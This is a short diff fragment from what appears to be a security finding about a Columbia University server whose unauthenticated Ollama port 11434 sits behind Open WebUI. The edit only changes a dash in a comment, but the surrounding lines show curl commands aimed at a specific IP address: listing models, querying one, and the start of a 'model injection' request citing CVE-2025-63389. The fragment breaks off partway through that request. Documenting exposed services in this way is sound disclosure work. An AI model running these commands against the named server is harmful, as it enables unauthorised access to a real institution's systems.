@@ -66,7 +66,7 @@ Columbia University server running Open WebUI v0.8.12 (auth enabled) with raw Ol
 Open WebUI auth on port 3000 does not protect raw Ollama port 11434.
 
 ```bash
-curl http://128.59.106.97:11434/api/tags          # model list — no auth
+curl http://128.59.106.97:11434/api/tags          # model list - no auth
 curl http://128.59.106.97:11434/api/show -d '{"model":"qwen2.5:32b-instruct-q4_K_M"}'
 # model injection (CVE-2025-63389):
 curl -X POST http://128.59.106.97:11434/api/create \
